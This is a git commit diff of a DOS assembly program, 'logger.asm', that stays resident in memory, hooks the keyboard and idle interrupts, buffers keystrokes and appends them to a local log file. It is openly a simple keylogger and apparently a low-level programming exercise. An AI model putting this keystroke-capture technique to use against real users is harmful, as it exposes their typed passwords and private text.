825399ae77c79f6f88838c5b7ad852fb8e9b5ee8
Danila <54887530+Razeza@users.noreply.github.com>
2020-05-23 15:16:02 +0300

    Add files via upload

--- logger.asm
+++ logger.asm
@@ -1,103 +1,41 @@
-.model tiny
 .186
-.data
-
-;text: db "MAX pdr", 10, 13
- 
-codes db 256 dup(0)
-
-Old28_o dw 0
-Old28_s dw 0
-
-.code
+.model tiny
+.code 
 org 100h
-         
+locals @@
+
 
 INT_9		equ 	9h*4h
 INT_28		equ	28h*4h
 
 Start:
+
 		mov bx, INT_9
 		mov dx, offset New09
 		call interupt_new_9
 		call interupt_new_28
 
-		call stay_resident
+
+                call stay_resident
 
 
+;====================================a?======
+;Programm ends and stay resident
+;====================================>=======
 
+RESIDENT	equ	3100h
 
-New09		proc
-		
-		push ax bx
-		
-		call write_scan_code
-		call shine_bit
-	
-		mov al, 20h            ;say that interupt ended		
-		out 20h, al
+stay_resident	proc
 
-		pop bx ax
-		
-		db 0eah
-Old09 		dw 0
-		dw 0
-
-		iret
-		endp
-
-;FILE_NAME: db "S:\log\loger.txt", 0
-
-New28		proc
-		push ax bx ds dx 
-		pushf
-	
-		call open_file
-		call pointer_to_end
-		call write_file
-		call close_file
-
-		popf
-		pop dx ds bx ax
-
-		pushf
-		call dword ptr cs:[Old28]
-
-		
-		iret
-		endp
-Old28 dw 0
-      dw 0
-;===========================================
-;reads from 60 port and writes to massive
-;============================================
-write_scan_code	proc
-
-		xor bx, bx
-		in al, 60h
-
-		inc codes[0]
-		mov bl, codes[0]
-		mov codes[bx], al
-		
-		ret
-endp
-
-;===============================================
-;Destroy - ax
-;===============================================
-
-shine_bit 	proc
-
-		in al, 61h		
-		mov ah, al
-		or al, 80h		
-		out 61h, al
-		mov al, ah
-		out 61h, al
+		mov ax, RESIDENT
+		mov dx, offset EndLabel 
+		shr dx, 4
+		inc dx  
+		int 21h
 
 		ret
 endp
+
 ;==============================================
 ;Destruct - bx, ax, es
 ;Input    - bx - number of interuption * 4
@@ -106,19 +44,21 @@ endp
 ;===========>==================================
 
 interupt_new_9	proc
-		xor ax, ax
-		mov es, ax
 
 		cli
 
-		mov ax, word ptr es:[bx]
-		mov Old09, ax
-		mov ax, word ptr es:[bx+2]
-		mov Old09 + 2, ax
+		mov bx, INT_9
+		xor ax, ax
+		mov es, ax
 
-		mov word ptr es:[bx], dx
-		mov ax, cs
-		mov word ptr es:[bx+2], ax
+		mov ax, word ptr es:[bx]
+		mov word ptr Old09_o, ax
+		mov ax, word ptr es:[bx+2]
+		mov word ptr Old09_s, ax
+
+		mov ax, 2509h
+		mov dx, offset New09
+		int 21h	
 
 		sti
 
@@ -141,9 +81,9 @@ interupt_new_28	proc
 		mov es, ax
 
 		mov ax, word ptr es:[bx]
-		mov word ptr Old28, ax
+		mov word ptr Old28_o, ax
 		mov ax, word ptr es:[bx + 2]
-		mov word ptr Old28 + 2, ax
+		mov word ptr Old28_s, ax
 
 		mov ax, 2528h
 		mov dx, offset New28
@@ -153,19 +93,72 @@ interupt_new_28	proc
 
 		ret
 endp
-;====================================ра======
-;Programm ends and stay resident
-;====================================>=======
 
-RESIDENT	equ	3100h
+New28 proc
+		pusha
+		push es ds
 
-stay_resident	proc
+		call write_buff 
 
-		mov ax, RESIDENT
-		mov dx, offset EndLabel 
-		shr dx, 4
-		inc dx  
-		int 21h
+		pop ds es
+		popa
+
+			
+		pushf
+		call dword ptr cs:[Old28_o] 	;call original int 28h
+
+		iret
+endp
+
+
+
+Old28_o dw 0
+Old28_s dw 0
+
+
+New09 proc
+		pusha
+		push es ds
+
+		pushf
+		call dword ptr cs:[Old09_o] 	;call original int 9h
+
+
+		call read_to_buff	
+		
+		pop ds es
+		popa
+
+		iret
+endp
+		
+Old09_o dw 0
+Old09_s dw 0
+
+		
+
+read_to_buff proc 
+	
+		push ds
+		push cs
+		pop ds
+				
+		mov ah, 01h ;save alpha	
+		int 16h
+
+		jz @@exit
+
+		mov bl, tail_ind  ;setting bl as place to move
+		xor bh, bh
+
+                mov buff[bx], al
+		inc tail_ind 
+
+
+@@exit:
+
+		pop ds
+
 		ret
 endp
 
@@ -174,7 +167,6 @@ endp
 ;Output  - bx - file handler, dx - file trail
 ;===================================================
 OPEN		equ	3dh
-FILE_NAME: db "S:\log\loger.txt", 0 
 
 open_file	proc
 		
@@ -183,7 +175,7 @@ open_file	proc
 		mov al, 1
 		int 21h
 
-		mov bx, ax	
+		mov file_handler, ax	
 		ret
 endp
 
@@ -191,21 +183,21 @@ endp
 ;Input - bx - file handler
 ;Destroy - ax, cx, dx
 ;=====================================================
-MOVE_POINTER	equ	42h
+MOVE_POINTER	equ	4202h
 
 pointer_to_end	proc
 
-		mov ah, MOVE_POINTER   
-		mov cx, 0
-		mov dx, 0	
-		mov al, 2
+		mov ax, MOVE_POINTER  
+		mov bx, file_handler 
+		xor cx, cx
+		xor dx, dx
 		int 21h
 
 		ret
 endp
 
 ;==================================================
-;Input - bx - file handler
+;Input -  file_handler
 ;	 cx - number of bytes to write
 ;	 ds:dx - adress of a buffer
 ;Destroy - ah
@@ -213,12 +205,9 @@ endp
 
 WRITE		equ 	40h
 
-text: db "MAX pdr", 10, 13
-
 write_file	proc
-		
-		mov dx, offset codes
-		mov cx, 11
+
+		mov bx, file_handler
 		mov ah, WRITE
 		int 21h
 
@@ -228,18 +217,69 @@ endp
 ;==============================================?===
 ;Input - bx - filg handler
 ;Destroy - ah
-;============ра=====================================
+;============a?=====================================
 
 CLOSE		equ 3eh
 
 close_file	proc
 		
 		mov ah, CLOSE
+		mov bx, file_handler
 		int 21h
 
 		ret
 endp
 
-EndLabel:
+write_buff proc 
 
-End Start
+
+		push ds
+		push cs
+		pop ds
+		
+		mov cl, cs:tail_ind
+		xor ch, ch
+	
+		push cx
+
+		call open_file
+		call pointer_to_end
+		
+			mov al, head_ind    ; necessary dx - adress of a buffer
+			xor ah, ah
+			mov dx, offset buff
+			add dx, ax
+	
+			pop cx
+
+	
+			sub cl, head_ind    ;length
+			xor ch, ch
+		
+			call write_file
+		
+		add cl, head_ind
+		xor ch, ch
+		mov head_ind, cl
+
+		call close_file
+
+		pop ds
+
+		ret
+endp
+
+
+
+
+
+FILE_NAME db 'S:\Bin\log.txt', 0
+file_handler dw ?
+
+head_ind db 0d
+tail_ind db 0d
+
+buff db 256d dup (0h)
+
+EndLabel:
+end Start
